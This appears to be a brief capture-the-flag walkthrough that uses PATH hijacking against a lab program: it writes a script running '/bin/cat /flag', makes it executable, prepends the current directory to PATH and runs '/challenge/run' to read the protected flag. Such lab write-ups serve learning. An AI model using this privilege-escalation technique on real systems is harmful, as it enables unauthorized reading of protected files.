first we need to find where the cat command is which can be done using `which cat`
this will give us the directory cat command is in. 

We now have to create a script using `nano win` 
in the shell we set the command as `/bin/cat /flag`
Make the script executable using `chmod +x win`
Now we prepend the current directory to the new directory using `export PATH=$(pwd):$PATH`
run `/challenge/run` to get the flag
